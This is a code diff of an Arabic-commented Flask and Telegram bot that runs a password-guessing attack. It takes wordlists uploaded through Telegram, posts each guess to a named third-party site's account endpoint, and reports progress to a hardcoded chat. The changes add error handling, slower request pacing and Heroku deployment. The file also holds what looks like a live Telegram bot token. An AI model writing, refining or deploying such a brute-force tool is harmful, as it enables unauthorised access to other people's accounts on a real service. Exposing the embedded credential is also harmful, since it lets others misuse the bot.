@@ -1,6 +1,7 @@
 import requests
 import json
 import time
+import os
 from flask import Flask, request
 
 app = Flask(__name__)
@@ -8,7 +9,7 @@ app = Flask(__name__)
 # بيانات تيليجرام
 telegram_bot_token = "6724140823:AAE1pkFDNCAaKa1ahmXan8EJGyCNoTFTpg0"
 telegram_api_url = f"https://api.telegram.org/bot{telegram_bot_token}"
-telegram_chat_id = None
+telegram_chat_id = 1701465279
 
 # بيانات تسجيل الدخول
 login_data = {
@@ -33,8 +34,12 @@ current_index = 0
 # دالة إرسال رسالة تيليجرام
 def send_telegram_message(chat_id, text):
     url = f"{telegram_api_url}/sendMessage"
-    payload = {"chat_id": chat_id, "text": text}
-    requests.post(url, json=payload)
+    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
+    try:
+        response = requests.post(url, json=payload)
+        response.raise_for_status()
+    except requests.exceptions.RequestException as e:
+        print(f"❌ خطأ في إرسال رسالة تيليجرام: {e}")
 
 # دالة تجربة كلمة مرور
 def try_password(password):
@@ -47,8 +52,12 @@ def try_password(password):
         'token': token,
     }
     url = "https://btsmoa.btswork.vip/api/user/setuserinfo"
-    response = requests.post(url, json=data, headers=headers)
-    return response.json()
+    try:
+        response = requests.post(url, json=data, headers=headers)
+        return response.json()
+    except requests.exceptions.RequestException as e:
+        print(f"❌ خطأ في تجربة كلمة المرور: {e}")
+        return {}
 
 # دالة بدء عملية التخمين
 def start_guessing():
@@ -71,7 +80,7 @@ def start_guessing():
         send_telegram_message(telegram_chat_id, progress_message)
 
         # انتظار بسيط لتقليل الحمل
-        time.sleep(0.1)
+        time.sleep(0.2)
 
     if current_index >= total_passwords:
         send_telegram_message(telegram_chat_id, "✅ انتهى التخمين، تم تجربة جميع كلمات المرور!")
@@ -106,15 +115,20 @@ def telegram_webhook():
             if "result" in file_response:
                 file_path = file_response["result"]["file_path"]
                 download_url = f"https://api.telegram.org/file/bot{telegram_bot_token}/{file_path}"
-                file_content = requests.get(download_url).text
-                password_list = file_content.splitlines()
-                current_index = 0
 
-                send_telegram_message(chat_id, f"📁 تم تحميل الملف. يحتوي على {len(password_list)} كلمة مرور. يتم الآن بدء التخمين...")
-                start_guessing()
+                try:
+                    file_content = requests.get(download_url).text
+                    password_list = file_content.splitlines()
+                    current_index = 0
+
+                    send_telegram_message(chat_id, f"📁 تم تحميل الملف. يحتوي على {len(password_list)} كلمة مرور. يتم الآن بدء التخمين...")
+                    start_guessing()
+                except Exception as e:
+                    send_telegram_message(chat_id, f"❌ خطأ في تحميل الملف: {e}")
 
     return {"ok": True}
 
-# تشغيل السيرفر
+# تشغيل السيرفر في Heroku
 if __name__ == "__main__":
-    app.run(port=5000)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
